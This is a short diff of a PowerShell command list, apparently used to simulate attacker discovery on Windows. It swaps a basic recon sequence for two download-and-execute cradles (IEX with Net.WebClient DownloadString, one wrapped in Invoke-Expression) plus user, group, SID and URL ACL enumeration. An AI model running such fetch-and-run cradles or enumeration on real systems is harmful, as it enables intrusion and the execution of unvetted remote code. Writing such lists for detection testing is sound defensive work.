@@ -1,4 +1,6 @@
-Get-ChildItem .
-ipconfig
-curl https://arcewrsfsdfsfe
-sleep 10
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')
+Get-WMIObject Win32_Group
+([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1")'
+get-wmiObject -class Win32_UserAccount
+netsh http show urlacl
